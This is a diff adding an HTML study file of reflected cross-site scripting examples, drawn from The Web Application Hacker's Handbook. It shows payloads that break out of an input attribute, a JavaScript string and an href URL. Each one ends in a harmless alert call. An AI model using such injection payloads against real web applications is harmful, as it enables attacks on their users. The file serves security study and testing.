@@ -1,0 +1,30 @@
+<html>
+<head>
+</head>
+<body>
+   <!--
+   - Main Reference for the below examples: The Web Application Hacker's handbook 
+   - Chapter : Chapter 12, Attacking Users: Cross-Site Scripting
+   - Section : Testing Reflection to introduce Script 
+   -->
+   
+   <!-- Example #1 : Tag Attribute value --> 
+        <input type="text" name="address1" value="injectionPoint">"><script> alert("XSS")</script>
+        <!-- a possible bypass if the above injection is blocked is to inject within the input tag , as below -->
+        <input type="text" name="address1" value="abcd" onfocus =alert(1)>
+        
+   <!-- Example #2 : A JS String --> 
+   <script> var a = 'injectionPoint'; var b = 123 </script>
+        <!-- a possible payloads -->
+        <!-- 1) ';alert(1); var foo='  -->
+        <script> var a = '';alert(1); var foo=''; b = 123 </script>
+        <!-- 2) ';alert(1); // -->
+        <script> var a = '';alert(1); //'; b = 123 </script>
+        
+   <!-- Example #3 : An Attribute Containing URL --> 
+   <a href='injectionPoint'> click here .. </a>
+        <!-- a possible payloads -->
+        <!-- 1) javascript:alert(1);  -->
+        <a href='javascript:alert(1);'> click here .. </a>
+</body>
+</html>
